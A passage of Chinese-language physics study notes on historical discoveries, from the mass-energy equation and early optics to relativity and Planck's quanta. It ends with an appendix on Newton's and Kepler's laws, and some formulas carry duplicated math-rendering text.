66、爱因斯坦还提出了相对论中的一个重要结论——质能方程式E=mc2。 67、公元前468～前376，我国的墨翟及其弟子在《墨经》中记载了光的直线传播。影的形成。光的反射。平面镜和球面镜成像等现象，为世界上最早的光学著作。 68、1849年法国物理学家斐索首先在地面上测出了光速，以后又有许多科学家采用了更精密的方法测定光速，如美国物理学家迈克尔逊的旋转棱镜法。（注意其测量方法） 69、关于光的本质：17世纪明确地形成了两种学说：一种是牛顿主张的微粒说，认为光是光源发出的一种物质微粒。另一种是荷兰物理学家惠更斯提出的波动说，认为光是在空间传播的某种波。这两种学说都不能解释当时观察到的全部光现象。 70、物理学晴朗天空上的两朵乌云： ①迈克逊－莫雷实验一相对论（高速运动世界）； ②热辐射实验一一量子论（微观世界）。 71、19世纪和20世纪之交，物理学的三大发现：x射线的发现，电子的发现，放射性同位素的发现。 72、1905年，爱因斯坦提出了狭义相对论，有两条基本原理： ①相对性原理——不同的惯性参考系中，一切物理规律都是相同的。 ②光速不变原理——不同的惯性参考系中，光在真空中的速度一定是c不变。 73、1900年，德国物理学家普朗克解释物体热辐射规律提出能量子假说：物质发射或吸收能量时，能量不是连续的，而是一份一份的，每一份就是一个最小的能量单位，即能量子。 74、激光——被誉为20世纪的“世纪之光”。 附录 牛顿运动定律 牛顿第一运动定律：在没有外力作用下孤立质点保持静止或做匀速直线运动； 牛顿第二运动定律：F=maF=maF=ma 牛顿第三运动定律：相互作用的两个质点之间的作用力和反作用力总是大小相等，方向相反，作用在同一条直线上； 开普勒三大定律 轨道定律：每个行星都沿着一个椭圆形的轨道绕太阳转动，太阳位于该椭圆的一个焦点上。 面积定律：在任意给定的时间内，太阳和行星之间的连线扫过的面积是相等的。 周期定律：行星绕太阳公转的周期的平方与其椭圆轨道的半长轴的立方成正比。（r3T2=G4π2M=PM\\frac{r^3}{T^2} = \\frac{G}{4\\pi^2}M = PMT2r3​=4π2G​M=PM）（令P=G4π2P = \\frac{G}{4\\pi^2}P=4π2G​）"}]